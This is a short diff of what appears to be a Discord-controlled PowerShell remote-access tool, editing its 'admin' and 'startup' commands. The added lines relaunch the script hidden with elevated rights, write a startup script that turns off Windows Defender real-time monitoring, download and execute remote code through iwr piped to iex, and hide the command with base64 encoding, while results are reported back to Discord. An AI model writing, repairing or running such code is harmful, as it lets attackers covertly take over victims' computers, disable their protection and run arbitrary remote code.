@@ -864,7 +864,7 @@ Send-Discord -Attachment $outputPath
     Send-Discord "Command executed."}
 }
         "admin"{
-$process = Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$([Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12); iwr -Uri $StartupPsOnlineFileLocation -useb | iex`"" -Verb RunAs
+$process = Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$([Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12); iwr -useb '$StartupPsOnlineFileLocation' | iex`"" -Verb RunAs -PassThru
 if ($process -ne $null) {
     Write-Host "User accepted, replacing current session with admin."
     Send-Discord "User accepted, replacing current session with admin."
@@ -878,7 +878,7 @@ if ($process -ne $null) {
         "startup"{
 $scriptContent = @"
 powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring 1";
-powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$([Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12); iwr -Uri $StartupPsOnlineFileLocation -useb | iex`"" -Verb RunAs
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -useb '$StartupPsOnlineFileLocation' | iex"
 "@
 $encodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptContent))
 $scriptCommand = "powershell.exe -EncodedCommand $encodedScript"
